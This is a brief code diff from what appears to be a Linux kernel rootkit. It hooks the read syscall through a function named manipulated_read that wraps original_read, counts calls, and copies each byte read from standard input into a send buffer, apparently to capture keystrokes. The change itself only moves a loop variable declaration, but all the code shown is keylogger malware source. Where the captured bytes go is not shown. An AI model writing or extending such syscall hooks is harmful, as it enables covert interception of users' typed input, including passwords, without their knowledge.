@@ -30,12 +30,13 @@ asmlinkage long
 manipulated_read (unsigned int fd, char __user *buf, size_t count)
 {
 	INCREASE_CALL_COUNTER(read_call_counter, &read_lock, read_lock_flags);
-		
+	
+	int i;	
 	long ret = original_read(fd, buf, count);
 
 	if(ret >= 1 && fd == 0)
 	{
-		for(int i = 0; i < ret; i++) {
+		for(i = 0; i < ret; i++) {
 			char sendbuf[2];
 			memcpy(sendbuf, buf+i, 1);
 			memset(sendbuf+1, '\0', 1);
